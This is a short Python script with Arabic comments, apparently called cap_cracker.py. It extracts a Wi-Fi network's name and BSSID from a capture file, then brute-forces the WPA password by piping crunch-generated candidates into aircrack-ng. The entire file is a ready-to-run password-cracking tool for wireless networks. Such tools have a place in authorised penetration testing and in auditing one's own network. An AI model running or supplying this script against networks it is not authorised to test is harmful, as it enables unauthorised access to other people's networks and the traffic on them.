#!/usr/bin/python3

import sys
import subprocess
from scapy.all import rdpcap, Dot11Beacon, Dot11Elt

def extract_essid_and_bssid(packets):
    essid = None
    bssid = None

    # البحث عن الحزم التي تحتوي على الـ Beacon و استخراج الـ ESSID و BSSID
    for pkt in packets:
        if pkt.haslayer(Dot11Beacon):  # هذه الحزمة تحتوي على Beacon
            essid = pkt[Dot11Elt].info.decode()
            bssid = pkt.addr2.replace(":", "")
            break

    if essid and bssid:
        return essid, bssid
    else:
        print("[INFO] لم يتم العثور على ESSID أو BSSID.")
        return None, None

def crack_with_crunch_and_aircrack(cap_file, min_len, max_len, charset):
    # قراءة حزم الـ pcap لاستخراج الـ ESSID و BSSID
    packets = rdpcap(cap_file)
    essid, bssid = extract_essid_and_bssid(packets)

    if not essid or not bssid:
        print("[!] لا يمكن استخراج ESSID أو BSSID من الملف.")
        return

    print(f"[INFO] تم العثور على الشبكة: {essid} (BSSID: {bssid})")

    # بناء أمر crunch لتوليد كلمات المرور
    crunch_command = [
        "crunch", str(min_len), str(max_len), charset
    ]
    
    # بناء أمر aircrack-ng لاختبار كلمات المرور مباشرة مع تحديد ESSID و BSSID
    aircrack_command = [
        "aircrack-ng", cap_file, "-w", "-", "-b", bssid
    ]
    
    # تنفيذ crunch و aircrack-ng معًا باستخدام بايب (pipe)
    try:
        print(f"[INFO] بدء توليد كلمات المرور باستخدام crunch...")
        crunch = subprocess.Popen(
            crunch_command, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL
        )
        aircrack = subprocess.Popen(
            aircrack_command, stdin=crunch.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        # قراءة إخراج aircrack-ng لمعرفة إذا تم العثور على كلمة المرور
        while True:
            output = aircrack.stdout.readline()
            if output == b"" and aircrack.poll() is not None:
                break
            if output:
                print(output.decode().strip())

        # التحقق من الأخطاء
        error = aircrack.stderr.read()
        if error:
            print(f"[ERROR] خطأ في عملية aircrack-ng: {error.decode().strip()}")
        
        # التحقق من إخراج aircrack-ng بشكل كامل
        output, error = aircrack.communicate()
        if output:
            print(output.decode())
        if error:
            print(error.decode())

    except Exception as e:
        print(f"[!] خطأ أثناء التشغيل: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("الاستخدام: python3 cap_cracker.py ملف.cap طول_من طول_إلى حروف")
        sys.exit()

    cap_file = sys.argv[1]
    min_len = int(sys.argv[2])
    max_len = int(sys.argv[3])
    charset = sys.argv[4]

    crack_with_crunch_and_aircrack(cap_file, min_len, max_len, charset)
